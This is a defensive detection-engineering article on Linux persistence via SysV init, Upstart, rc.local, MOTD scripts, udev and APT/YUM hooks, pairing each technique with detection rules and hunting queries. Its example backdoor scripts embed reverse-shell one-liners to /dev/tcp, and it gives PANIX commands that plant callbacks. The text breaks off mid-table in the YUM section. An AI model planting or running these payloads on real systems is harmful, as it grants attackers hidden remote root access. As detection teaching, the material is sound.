---
title: "Linux Detection Engineering - A Sequel on Persistence Mechanisms"
slug: "sequel-on-persistence-mechanisms"
date: "2024-08-30"
subtitle: "A walkthrough on how threat actors establish persistence on Linux systems and how to hunt for these techniques."
description: "In this final part of this Linux persistence series, we'll continue exploring persistence mechanisms on Linux systems, focusing on more advanced techniques and how to detect them."
author:
  - slug: ruben-groenewoud
image: "sequel-on-persistence-mechanisms.jpg"
category:
  - slug: detection-science
tags:
  - linux
  - persistence
---

## Introduction

In this third part of the [Linux Detection Engineering series](https://search.elastic.co/?q=Linux%20Detection%20Engineering&location%5B0%5D=Security%20Labs&author%5B0%5D=Ruben%20Groenewoud), we’ll dive deeper into the world of Linux persistence. We start with common or straightforward methods and move towards more complex or obscure techniques. The goal remains the same: to educate defenders and security researchers on the foundational aspects of Linux persistence by examining both trivial and more complicated methods, understanding how these methods work, how to hunt for them, and how to develop effective detection strategies.

In the previous article - "Linux Detection Engineering - a primer on persistence mechanisms" - we explored the foundational aspects of Linux persistence techniques. If you missed it, you can find it [here](https://www.elastic.co/security-labs/primer-on-persistence-mechanisms).

We'll set up the persistence mechanisms, analyze the logs, and observe the potential detection opportunities. To aid in this process, we’re sharing [PANIX](https://github.com/Aegrah/PANIX), a Linux persistence tool that Ruben Groenewoud of Elastic Security developed. PANIX simplifies and customizes persistence setup to test potential detection opportunities.

By the end of this series, you'll have gained a comprehensive understanding of each of the persistence mechanisms that we covered, including:

* How it works (theory)
* How to set it up (practice)
* How to detect it (SIEM and Endpoint rules)
* How to hunt for it (ES|QL and OSQuery reference hunts)

Let’s go beyond the basics and dig a little bit deeper into the world of Linux persistence, it’s fun!

## Setup note

To ensure you are prepared to detect the persistence mechanisms discussed in this article, it is important to [enable and update our pre-built detection rules](https://www.elastic.co/guide/en/security/current/prebuilt-rules-management.html#update-prebuilt-rules). If you are working with a custom-built ruleset and do not use all of our pre-built rules, this is a great opportunity to test them and potentially fill in any gaps. Now, we are ready to get started. 

## T1037 - boot or logon initialization scripts: Init

Init, short for "initialization," is the first process started by the kernel during the boot process on Unix-like operating systems. It continues running until the system is shut down. The primary role of an init system is to start, stop, and manage system processes and services.

There are three major init implementations - [Systemd](https://man7.org/linux/man-pages/man1/systemd.1.html), [System V](https://linux.die.net/man/8/service), and [Upstart](https://linux.die.net/man/7/upstart). In [part 1](https://www.elastic.co/security-labs/primer-on-persistence-mechanisms) of this series, we focused on Systemd. In this part, we will explore System V and Upstart. MITRE does not have specific categories for System V or Upstart. These are generally part of [T1037](https://attack.mitre.org/techniques/T1037/).

### T1037 - boot or logon initialization scripts: System V init

[System V (SysV) init](https://linux.die.net/man/8/service) is one of the oldest and most traditional init systems. SysV init scripts are gradually being replaced by modern init systems like Systemd. However, `systemd-sysv-generator` allows Systemd to handle traditional SysV init scripts, ensuring older services and applications can still be managed within the newer framework.

The `/etc/init.d/` directory is a key component of the SysV init system. It is responsible for controlling the startup, running, and shutdown of services on a system. Scripts in this directory are executed at different run levels to manage various system services. Despite the rise of Systemd as the default init system in many modern Linux distributions, `init.d` scripts are still widely used and supported, making them a viable option for persistence.

The scripts in `init.d` are used to start, stop, and manage services. These scripts are executed with root privileges, providing a powerful means for both administrators and attackers to ensure certain commands or services run on boot. These scripts are often linked to [runlevel](https://linux.die.net/man/7/runlevel) directories like `/etc/rc0.d/`, `/etc/rc1.d/`, etc., which determine when the scripts are run. Runlevels, ranging from 0 to 6, define specific operational states, each configuring different services and processes to manage system behavior and user interactions. Runlevels vary depending on the distribution, but generally look like the following:

* 0: Shutdown
* 1: Single User Mode
* 2: Multiuser mode without networking
* 3: Multiuser mode with networking
* 4: Unused
* 5: Multiuser mode with networking and GUI
* 6: Reboot

During system startup, scripts are executed based on the current runlevel configuration. Each script must follow a specific structure, including `start`, `stop`, `restart`, and `status` commands to manage the associated service. Scripts prefixed with `S` (start) or `K` (kill) dictate actions during startup or shutdown, respectively, ordered by their numerical sequence.

An [example](https://github.com/Aegrah/PANIX/blob/main/panix.sh#L1864-L1881) of a malicious `init.d` script might look similar to the following:

```
#! /bin/sh
### BEGIN INIT INFO
# Provides:             malicious-sysv-script
# Required-Start:       $remote_fs $syslog
# Required-Stop:        $remote_fs $syslog
# Default-Start:        2 3 4 5
# Default-Stop:         0 1 6
### END INIT INFO

case "$1" in
  start)
    echo "Starting malicious-sysv-script"
    nohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'
    ;;
esac
```

The script must be placed in the `/etc/init.d/` directory and be granted execution permissions. Similarly to Systemd services, SysV scripts must also be enabled. A common utility to manage SysV configurations is `update-rc.d`. It allows administrators to enable or disable services and manage the symbolic links (start and kill scripts) in the `/etc/rc*.d/` directories, automatically setting the correct runlevels based on the configuration of the script.

```
sudo update-rc.d malicious-sysv-script defaults
```

The `malicious-sysv-script` is now enabled and ready to run on boot. MITRE specifies more information and real-world examples related to this technique in [T1037](https://attack.mitre.org/techniques/T1037/).

#### Persistence through T1037 - System V init

You can manually set up a test script within the `/etc/init.d/` directory, grant it execution permissions, enable it, and reboot it, or simply use [PANIX](https://github.com/aegrah/PANIX). PANIX is a Linux persistence tool that simplifies and customizes persistence setup for testing your detections. We can use it to establish persistence simply by running:

```
> sudo ./panix.sh --initd --default --ip 192.168.1.1 --port 2006
> [+] init.d backdoor established with IP 192.168.1.1 and port 2006.
```

Prior to rebooting and actually establishing persistence, we can see the following documents being generated in Discover:

![Events generated as a result of System V init persistence establishment](/assets/images/sequel-on-persistence-mechanisms/image14.png "Events generated as a result of System V init persistence establishment")

After executing PANIX, it generates a SysV init script named `/etc/init.d/ssh-procps`, applies executable permissions using `chmod +x`, and utilizes `update-rc.d`. This command triggers `systemctl daemon-reload`, which, in turn, activates the `systemd-sysv-generator` to enable `ssh-procps` during system boot.

Let’s reboot the system and look at the events that are generated on shutdown/boot.

![Events generated as a result of System V init persistence establishment](/assets/images/sequel-on-persistence-mechanisms/image8.png "Events generated as a result of System V init persistence establishment")

As the SysV init system is loaded early, the start command is not logged. Since it is impossible to detect an event before events are being ingested, we need to be creative in detecting this technique. Elastic will capture `already_running` event actions for service initialization events. Through this chain we are capable of detecting the execution of the service, followed by the reverse shell that was initiated. We have several detection opportunities for this persistence technique.

| Category | Coverage                                                     |
|----------|--------------------------------------------------------------|
| File     | [System V Init Script Created](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_init_d_file_creation.toml)                                 |
|          | [Suspicious File Creation in /etc for Persistence](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_etc_file_creation.toml)             |
|          | [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml)                  |
| Process  | [System V Init (init.d) Executed Binary from Unusual Location](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_system_v_init_(init.d)_executed_binary_from_unusual_location.toml) |
|          | [Executable Bit Set for Potential Persistence Script](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_potential_persistence_script_executable_bit_set.toml)          |
| Network  | [System V Init (init.d) Egress Network Connection](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_system_v_init_(init.d)_egress_network_connection.toml)             |



#### Hunting for T1037 - System V init

Other than relying on detections, it is important to incorporate threat hunting into your workflow, especially for persistence mechanisms like these, where events can potentially be missed due to timing. This blog will solely list the available hunts for each persistence mechanism; however, more details regarding this topic are outlined at the end of the first section in [the previous article on persistence](https://www.elastic.co/security-labs/primer-on-persistence-mechanisms). Additionally, descriptions and references can be found in our [Detection Rules repository](https://github.com/elastic/detection-rules), specifically in the [Linux hunting subdirectory](https://github.com/elastic/detection-rules/tree/main/hunting).

We can hunt for System V Init persistence through [ES|QL](https://www.elastic.co/guide/en/elasticsearch/reference/current/esql.html) and [OSQuery](https://www.elastic.co/guide/en/kibana/current/osquery.html), focusing on unusual process executions and file creations. The [Persistence via System V Init](https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_sysv_init.toml) rule contains several ES|QL and OSQuery queries that can help hunt for these types of persistence.

### T1037 - boot or logon initialization scripts: Upstart

[Upstart](https://linux.die.net/man/7/upstart) was introduced as an alternative init system designed to improve boot performance and manage system services more dynamically than traditional SysV init. While it has been largely supplanted by systemd in many Linux distributions, Upstart is still used in some older releases and legacy systems.

The core of Upstart's configuration resides in the `/etc/init/` directory, where job configuration files define how services are started, stopped, and managed. Each job file specifies dependencies, start conditions, and actions to be taken upon start, stop, and other events.

In Upstart, run levels are replaced with events and tasks, which define the sequence and conditions under which jobs are executed. Upstart introduces a more event-driven model, allowing services to start based on various system events rather than predefined run levels.

Upstart can run system-wide or in user-session mode. While system-wide configurations are placed in the `/etc/init/` directory, user-session mode configurations are located in:

* `~/.config/upstart/`
* `~/.init/`
* `/etc/xdg/upstart/`
* `/usr/share/upstart/sessions/`

An example of an Upstart job file can look like this:

```
description "Malicious Upstart Job"
author "Ruben Groenewoud"

start on runlevel [2345]
stop on shutdown

exec nohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'
```

The `malicious-upstart-job.conf` file defines a job that starts on run levels 2, 3, 4, and 5 (general Linux access and networking), and stops on run levels 0, 1, and 6 (shutdown/reboot). The `exec` line executes the malicious payload to establish a reverse shell connection when the system boots up.

To enable the Upstart job and ensure it runs on boot, the job file must be placed in `/etc/init/` and given appropriate permissions. Upstart jobs are automatically recognized and managed by the `Upstart init daemon`.

Upstart was deprecated a long time ago, with Linux distributions such as Debian 7 and Ubuntu 16.04 being the final systems that leverage Upstart by default. These systems moved to the SysV init system, removing compatibility with Upstart altogether. Based on the data in our [support matrix](https://www.elastic.co/support/matrix), only the Elastic Agent in Beta version supports some of these old operating systems, and the recent version of Elastic Defend does not run on them at all. These systems have been EOL for years and should not be used in production environments anymore.

Because of this reason, we added support/coverage for this technique to the [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml) detection rule. If you are still running these systems in production, using, for example, old versions of [Auditbeat](https://www.elastic.co/beats/auditbeat) to gather its logs, you can set up [Auditbeat file creation](https://www.elastic.co/guide/en/beats/auditbeat/current/configuration-auditbeat.html) and [FIM](https://www.elastic.co/docs/current/integrations/fim) file modification rules in the `/etc/init/` directory, similar to the techniques mentioned in the [previous blog](https://www.elastic.co/security-labs/primer-on-persistence-mechanisms), and in the sections yet to come. Similarly to System V Init, information and real-world examples related to this technique are specified by MITRE in [T1037](https://attack.mitre.org/techniques/T1037/).

## T1037.004 - boot or logon initialization scripts: run control (RC) scripts

The [rc.local](https://man.freebsd.org/cgi/man.cgi?rc.local) script is a traditional method for executing commands or scripts on Unix-like operating systems during system boot. It is located at `/etc/rc.local` and is typically used to start services, configure networking, or perform other system initialization tasks that do not warrant a full init script. In Darwin-based systems and very few other Unix-like systems, `/etc/rc.common` is used for the same purpose. 

Newer versions of Linux distributions have phased out the `/etc/rc.local` file in favor of Systemd for handling initialization scripts. Systemd provides compatibility through the [systemd-rc-local-generator](https://man7.org/linux/man-pages/man8/systemd-rc-local-generator.8.html) generator; this executable ensures backward compatibility by checking if `/etc/rc.local` exists and is executable. If it meets these criteria, it integrates the `rc-local.service` unit into the boot process. Therefore, as long as this generator is included in the Systemd setup, `/etc/rc.local` scripts will execute during system boot. In RHEL derivatives, `/etc/rc.d/rc.local` must be granted execution permissions for this technique to work. 

The `rc.local` script is a shell script that contains commands or scripts to be executed once at the end of the system boot process, after all other system services have been started. This makes it useful for tasks that require specific system conditions to be met before execution. Here’s an example of how a simple backdoored `rc.local` script might look:

```
#!/bin/sh
/bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'
exit 0
```

The command above creates a reverse shell by opening a bash session that redirects input and output to a specified IP address and port, allowing remote access to the system.

To ensure `rc.local` runs during boot, the script must be marked executable. On the next boot, the `systemd-rc-local-generator` will create the necessary symlink in order to enable the `rc-local.service` and execute the `rc.local` script. RC scripts did receive their own sub-technique by MITRE. More information and examples of real-world usage of RC Scripts for persistence can be found in [T1037.004](https://attack.mitre.org/techniques/T1037/004/).

### Persistence through T1037.004 - run control (RC) scripts

As long as the `systemd-rc-local-generator` is present, establishing persistence through this technique is simple. Create the `/etc/rc.local` file, add your payload, and mark it as executable. We will leverage the following PANIX command to establish it for us.

```
> sudo ./panix.sh --rc-local --default --ip 192.168.1.1 --port 2007
> [+] rc.local backdoor established 
```

After rebooting the system, we can see the following events being generated:

![Events generated as a result of RC Script persistence establishment](/assets/images/sequel-on-persistence-mechanisms/image6.png "Events generated as a result of RC Script persistence establishment")

The same issue as before arises. We see the execution of PANIX, creating the `/etc/rc.local` file and granting it execution permissions. When running `systemctl daemon-reload`, we can see the `systemd-rc-local-generator` creating a symlink in the `/run/systemd/generator[.early|late]` directories. 

Similar to the previous example in which we ran into this issue, we can again use the `already_running` `event.action` documents to get some information on the executions. Digging into this, one method that detects potential traces of `rc.local` execution is to search for documents containing `/etc/rc.local start` entries:

![Events generated as a result of rc.local service status](/assets/images/sequel-on-persistence-mechanisms/image7.png "Events generated as a result of rc.local service status")

Where we see `/etc/rc.local` being started, after which a suspicious command is executed. The `/opt/bds_elf` is a rootkit, leveraging `rc.local` as a persistence method. 

Additionally, we can leverage the [syslog](https://man7.org/linux/man-pages/man3/syslog.3.html) data source, as this file is parsed on initialization of the system integration. You can set up [Filebeat](https://www.elastic.co/beats/filebeat) or the [Elastic Agent](https://www.elastic.co/elastic-agent) with the [System integration](https://www.elastic.co/docs/current/en/integrations/system) to harvest syslog. When looking at potential errors in its execution logs, we can detect other traces of `rc.local` execution events for both our testing and rootkit executions:

![Events generated as a result of /etc/rc.local syslog error messages](/assets/images/sequel-on-persistence-mechanisms/image4.png "Events generated as a result of /etc/rc.local syslog error messages")

Because of the challenges in detecting these persistence mechanisms, it is very important to catch traces as early in the chain as possible. Leveraging a multi-layered defense strategy increases the chances of detecting techniques like these.

| Category | Coverage                                            |
|----------|-----------------------------------------------------|
| File     | [rc.local/rc.common File Creation](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_rc_script_creation.toml)                    |
|          | [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml)         |
| Process  | [Potential Execution of rc.local Script](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_rc_local_service_already_running.toml)              |
|          | [Executable Bit Set for Potential Persistence Script](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_potential_persistence_script_executable_bit_set.toml) |
| Syslog   | [Suspicious rc.local Error Message](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_rc_local_error_via_syslog.toml)                   |

### Hunting for T1037.004 - run control (RC) scripts

Similar to the System V Init detection opportunity limitations, this technique deals with the same limitations due to timing. Thus, hunting for RC Script persistence is important. We can hunt for this technique by looking at `/etc/rc.local` file creations and/or modifications and the existence of the `rc-local.service` systemd unit/startup item. The [Persistence via rc.local/rc.common](https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_rc_local.toml) rule contains several ES|QL and OSQuery queries that aid in hunting for this technique. 

## T1037 - boot or logon initialization scripts: Message of the Day (MOTD)

[Message of the Day (MOTD)](https://linux.die.net/man/5/motd) is a feature that displays a message to users when they log in via SSH or a local terminal. To display messages before and after the login process, Linux uses the `/etc/issue` and the `/etc/motd` files. These messages display on the command line and will not be seen before and after a graphical login. The `/etc/issue` file is typically used to display a login message or banner, while the `/etc/motd` file generally displays issues, security policies, or messages. These messages are global and will display to all users at the command line prompt. Only a privileged user (such as root) can edit these files.

In addition to the static `/etc/motd` file, modern systems often use dynamic MOTD scripts stored in `/etc/update-motd.d/`. These scripts generate dynamic content that can be included in the MOTD, such as current system metrics, weather updates, or news headlines.

These dynamic scripts are shell scripts that execute shell commands. It is possible to create a new file within this directory or to add a backdoor to an existing one. Once the script has been granted execution permissions, it will execute every time a user logs in.

RHEL derivatives do not make use of dynamic MOTD scripts in a similar way as Debian does, and are not susceptible to this technique. 

An example of a backdoored `/etc/update-motd.d/` file could look like this:

```
#!/bin/sh
nohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'
```

Like before, MITRE does not have a specific technique related to this. Therefore we classify this technique as [T1037](https://attack.mitre.org/techniques/T1037/).

### Persistence through T1037 - message of the day (MOTD)

A [payload](https://github.com/Aegrah/PANIX/blob/main/panix.sh#L1644-L1669) similar to the one presented above should be used to ensure the backdoor does not interrupt the SSH login, potentially triggering the user’s attention. We can leverage PANIX to set up persistence on Debian-based systems through MOTD like so:

```
 > sudo ./panix.sh --motd --default --ip 192.168.1.1 --port 2008
> [+] MOTD backdoor established in /etc/update-motd.d/137-python-upgrades
```

To trigger the backdoor, we can reconnect to the server via SSH or reconnect to the terminal.

![Events generated as a result of Message of the Day (MOTD) persistence establishment](/assets/images/sequel-on-persistence-mechanisms/image2.png "Events generated as a result of Message of the Day (MOTD) persistence establishment")

In the image above we can see PANIX being executed, which creates the `/etc/update-motd.d/137-python-upgrades` file and marks it as executable. Next, when a user connects to SSH/console, the payload is executed, resulting in an egress network connection by the root user. This is a straightforward attack chain, and we have several layers of detections for this:

| Category | Coverage                                             |
|----------|------------------------------------------------------|
| File     | [Message-of-the-Day (MOTD) File Creation](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_message_of_the_day_creation.tom)              |
|          | [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml)          |
| Process  | [Process Spawned from Message-of-the-Day (MOTD)](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_suspicious_process_spawned_from_motd_detected.toml)       |
|          | [Suspicious Message Of The Day Execution](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_suspicious_message_of_the_day_execution.toml)              |
|          | [Executable Bit Set for Potential Persistence Script](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_potential_persistence_script_executable_bit_set.toml)  |
| Network  | [MOTD Execution Followed by Egress Network Connection](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_motd_execution_followed_by_egress_network_connection.toml) |
|          | [Egress Network Connection by MOTD Child](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_egress_network_connection_by_motd_child.toml)              |

### Hunting for T1037 - message of the day (MOTD)

Hunting for MOTD persistence can be conducted through ES|QL and OSQuery. We can do so by analyzing file creations in these directories and executions from MOTD parent processes. We created the [Persistence via Message-of-the-Day](https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_message_of_the_day.toml) rule aid in this endeavor.

## T1546 - event triggered execution: udev

[Udev](https://man7.org/linux/man-pages/man7/udev.7.html) is the device manager for the Linux kernel, responsible for managing device nodes in the `/dev` directory. It dynamically creates or removes device nodes, manages permissions, and handles various events triggered by device state changes. Essentially, Udev acts as an intermediary between the kernel and user space, ensuring that the operating system appropriately handles hardware changes.

When a new device is added to the system (such as a USB drive, keyboard, or network interface), Udev detects this event and applies predefined rules to manage the device. Each rule consists of key-value pairs that match device attributes and actions to be performed. Udev rules files are processed in lexical order, and rules can match various device attributes, including device type, kernel name, and more. Udev rules are defined in text files within a default set of directories:

* `/etc/udev/rules.d/`
* `/run/udev/rules.d/`
* `/usr/lib/udev/rules.d/`
* `/usr/local/lib/udev/rules.d/`
* `/lib/udev/`

Priority is measured based on the source directory of the rule file and takes precedence based on the order listed above (`/etc/` → `/run/` → `/usr/`). When a rule matches, it can trigger a wide range of actions, including executing arbitrary commands or scripts. This flexibility makes Udev a potential vector for persistence by malicious actors. An example Udev rule looks like the following:

```
SUBSYSTEM=="block", ACTION=="add|change", ENV{DM_NAME}=="ubuntu--vg-ubuntu--lv", SYMLINK+="disk/by-dname/ubuntu--vg-ubuntu--lv"
```

To leverage this method for persistence, root privileges are required. Once a rule file is created, the rules need to be reloaded.

```
sudo udevadm control --reload-rules
```

To test the rule, either perform the action specified in the rule file or use the [udevadm](https://www.man7.org/linux/man-pages/man8/udevadm.8.html) trigger utility.

```
sudo udevadm trigger -v
```

Additionally, these drivers can be monitored using `udevadm`, by running:

```
udevadm monitor --environment
```

Eder’s [blog](https://ch4ik0.github.io/en/posts/leveraging-Linux-udev-for-persistence/) titled “Leveraging Linux udev for persistence” is a very good read for more information on this topic. This technique has several limitations, making it more difficult to leverage the persistence mechanism.

* Udev rules are limited to short foreground tasks due to potential blocking of subsequent events.
* They cannot execute programs accessing networks or filesystems, enforced by `systemd-udevd.service`'s sandbox.
* Long-running processes are terminated after event handling.

Despite these restrictions, bypasses include creating detached processes outside udev rules for executing implants, such as:

* Leveraging `at`/`cron`/`systemd` for independent scheduling.
* Injecting code into existing processes.

Although persistence would be set up through a different technique than udev, udev would still grant a persistence mechanism for the `at`/`cron`/`systemd` persistence mechanism. MITRE does not have a technique dedicated to this mechanism — the most logical technique to add this to would be [T1546](https://attack.mitre.org/techniques/T1546/).

Researchers from AON recently discovered a malware called "sedexp" that achieves persistence using Udev rules - a technique rarely seen in the wild - so be sure to check out [their research article](https://www.aon.com/en/insights/cyber-labs/unveiling-sedexp).

## Persistence through T1546 - udev

PANIX allows you to test all three techniques by leveraging `--at`, `--cron` and `--systemd`, respectively. Or go ahead and test it manually. We can set up udev persistence through `at`, by running the following command:

```
> sudo ./panix.sh --udev --default --ip 192.168.1.1 --port 2009 --at
```

To trigger the payload, you can either run `sudo udevadm trigger` or reboot the system. Let’s analyze the events in Discover.

![Events generated as a result of Udev At persistence establishment](/assets/images/sequel-on-persistence-mechanisms/image16.png "Events generated as a result of Udev At persistence establishment")

In the figure above, PANIX is executed, which creates the `/usr/bin/atest` backdoor and grants it execution permissions. Subsequently, the `10-atest.rules` file is generated, and the drivers are reloaded and triggered. This causes `At` to be spawned as a child process of `udevadm`, creating the `atspool`/`atjob`, and subsequently executing the reverse shell.

Cron follows a similar structure; however, it is slightly more difficult to catch the malicious activity, as the child process of `udevadm` is `bash`, which is not unusual.

![Events generated as a result of Udev Cron persistence establishment](/assets/images/sequel-on-persistence-mechanisms/image5.png "Events generated as a result of Udev Cron persistence establishment")

Finally, when looking at the documents generated by Udev in combination with Systemd, we see the following:

![Events generated as a result of Udev Systemd persistence establishment](/assets/images/sequel-on-persistence-mechanisms/image9.png "Events generated as a result of Udev Systemd persistence establishment")

Which also does not show a relationship with udev, other than the `12-systemdtest.rules` file that is created. 

This leads these last two mechanisms to be detected through our previous systemd/cron related rules, rather than specific udev rules. Let’s take a look at the coverage (We omitted the `systemd`/`cron` rules, as these were already mentioned in [the previous persistence blog](https://www.elastic.co/security-labs/primer-on-persistence-mechanisms)):

| Category | Coverage                                             |
|----------|------------------------------------------------------|
| File     | [Systemd-udevd Rule File Creation](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_udev_rule_creation.toml)                     |
|          | [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml)          |
| Process  | [At Utility Launched through Udevadm](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_at_utility_launched_through_udevadm.toml)                  |
|          | [Executable Bit Set for Potential Persistence Script](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_potential_persistence_script_executable_bit_set.toml)  |
| Network  | [Udev Execution Followed by Egress Network Connection](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_udev_execution_followed_by_egress_network_connection.toml) |

### Hunting for T1546 - udev

Hunting for Udev persistence can be conducted through ES|QL and OSQuery. By leveraging ES|QL, we can detect unusual file creations and process executions, and through OSQuery we can do live hunting on our managed systems. To get you started, we created the [Persistence via Udev](https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_udev.toml) rule, containing several different queries.

## T1546.016 - event triggered execution: installer packages

Package managers are tools responsible for installing, updating, and managing software packages. Three widely used package managers are [APT](https://linux.die.net/man/8/apt) (Advanced Package Tool), [YUM](https://man7.org/linux/man-pages/man8/yum.8.html) (Yellowdog Updater, Modified), and YUM’s successor, [DNF](https://man7.org/linux/man-pages/man8/dnf.8.html) (Danified YUM). Beyond their legitimate uses, these tools can be leveraged by attackers to establish persistence on a system by hijacking the package manager execution flow, ensuring malicious code is executed during routine package management operations. MITRE details information related to this technique under the identifier [T1546.016](https://attack.mitre.org/techniques/T1546/016/).

### T1546.016 - installer packages (APT)

[APT](https://linux.die.net/man/8/apt) is the default package manager for Debian-based Linux distributions like Debian, Ubuntu, and their derivatives. It simplifies the process of managing software packages and dependencies. APT utilizes several configuration mechanisms to customize its behavior and enhance package management efficiency. 

[APT hooks](https://manpages.debian.org/testing/apt/apt.conf.5.en.html) allow users to execute scripts or commands at specific points during package installation, removal, or upgrade operations. These hooks are stored in `/etc/apt/apt.conf.d/` and can be leveraged to execute actions pre- and post-installation. The structure of APT configuration files follows a numeric ordering convention to control the application of configuration snippets that customize various aspects of APT's behavior. A regular APT hook looks like this:

```
DPkg::Post-Invoke {"if [ -d /var/lib/update-notifier ]; then touch /var/lib/update-notifier/dpkg-run-stamp; fi; /usr/lib/update-notifier/update-motd-updates-available 2>/dev/null || true";};                                                                            APT::Update::Post-Invoke-Success {"/usr/lib/update-notifier/update-motd-updates-available 2>/dev/null || true";}; 
```

These configuration files can be exploited by attackers to execute malicious binaries or code whenever an APT operation is executed. This vulnerability extends to automated processes like auto-updates, enabling persistent execution on systems with automatic update features enabled.

#### Persistence through T1546.016 - installer packages (APT)

To test this method, a Debian-based system that leverages APT or the manual installation of APT is required. Make sure that if you perform this step manually, that you do not break the APT package manager, as [a carefully crafted payload](https://github.com/Aegrah/PANIX/blob/main/panix.sh#L2021C4-L2021C138) that detaches and runs in the background is necessary to not interrupt the execution chain. You can setup APT persistence by running:

```
> sudo ./panix.sh --package-manager --ip 192.168.1.1 --port 2012 --apt
> [+] APT persistence established
```

To trigger the payload, run an APT command, such as `sudo apt update`. This will spawn a reverse shell. Let’s take a look at the events in Discover:

![Events generated as a result of package manager (APT) persistence establishment](/assets/images/sequel-on-persistence-mechanisms/image10.png "Events generated as a result of package manager (APT) persistence establishment")

In the figure above, we see PANIX being executed, creating the `01python-upgrades` file, and successfully establishing the APT hook. After running `sudo apt update`, APT reads the configuration file and executes the payload, initiating the `sh` → `nohup` → `setsid` → `bash` reverse shell chain. Our coverage is multi-layered, and detects the following events:

| Category | Coverage                                          |
|----------|---------------------------------------------------|
| File     | [APT Package Manager Configuration File Creation](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_apt_package_manager_file_creation.toml)   |
|          | [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml)       |
| Process  | [Suspicious APT Package Manager Execution](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_apt_package_manager_execution.toml)          |
|          | [APT Package Manager Command Execution](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_apt_package_manager_command_execution.toml)             |
| Network  | [Suspicious APT Package Manager Network Connection](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_apt_package_manager_netcon.toml) |
|          | [APT Package Manager Egress Network Connection](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_apt_package_manager_egress_network_connection.toml)     |

### T1546.016 - installer packages (YUM)

[YUM](https://man7.org/linux/man-pages/man8/yum.8.html) (Yellowdog Updater, Modified) is the default package management system used in Red Hat-based Linux distributions like CentOS and Fedora. YUM employs [plugin architecture](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/6/html/deployment_guide/sec-yum_plugins) to extend its functionality, allowing users to integrate custom scripts or programs that execute at various stages of the package management lifecycle. These plugins are stored in specific directories and can perform actions such as logging, security checks, or custom package handling.

The structure of YUM plugins typically involves placing them in directories like:

* `/etc/yum/pluginconf.d/` (for configuration files)
* `/usr/lib/yum-plugins/` (for plugin scripts)

For plugins to be enabled, the `/etc/yum.conf` file must have the `plugins=1` set. These plugins can intercept YUM operations, modify package installation behaviors, or execute additional actions before or after package transactions. YUM plugins are quite extensive, but a basic YUM plugin template might look like [this](http://yum.baseurl.org/wiki/WritingYumPlugins.html):

```
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE

requires_api_version = '2.3'
plugin_type = (TYPE_CORE, TYPE_INTERACTIVE)

def init_hook(conduit):
    conduit.info(2, 'Hello world')

def postreposetup_hook(conduit):
    raise PluginYumExit('Goodbye')
```

Each plugin must be enabled through a `.conf` configuration file:

```
[main]                                                                                                                               enabled=1
```

Similar to APT's configuration files, YUM plugins can be leveraged by attackers to execute malicious code during routine package management operations, particularly during automated processes like system updates, thereby establishing persistence on vulnerable systems.

#### Persistence through T1546.016 - Installer Packages (YUM)

Similar to APT, YUM plugins should be crafted carefully to not interfere with the YUM update execution flow. Use [this example](https://github.com/Aegrah/PANIX/blob/main/panix.sh#L2025-L2047) or set it up by running:

```
> sudo ./panix.sh --package-manager --ip 192.168.1.1 --port 2012 --yum
[+] Yum persistence established
```

After planting the persistence mechanism, a command similar to `sudo yum upgrade` can be run to establish a reverse connection.

![Events generated as a result of package manager (YUM) persistence establishment](/assets/images/sequel-on-persistence-mechanisms/image1.png "Events generated as a result of package manager (YUM) persistence establishment")

We see PANIX being executed, `/usr/lib/yumcon`, `/usr/lib/yum-plugins/yumcon.py` and `/etc/yum/pluginconf.d/yumcon.conf` being created. `/usr/lib/yumcon` is executed by `yumcon.py`, which is enabled in `yumcon.conf`. After updating the system, the reverse shell execution chain (`yum` → `sh` → `setsid` → `yumcon` → `python`) is executed. Similar to APT, our YUM coverage is multi-layered, and detects the following events:

| Category | Coverage                                              |
|----------|-------------------------------------------------------|
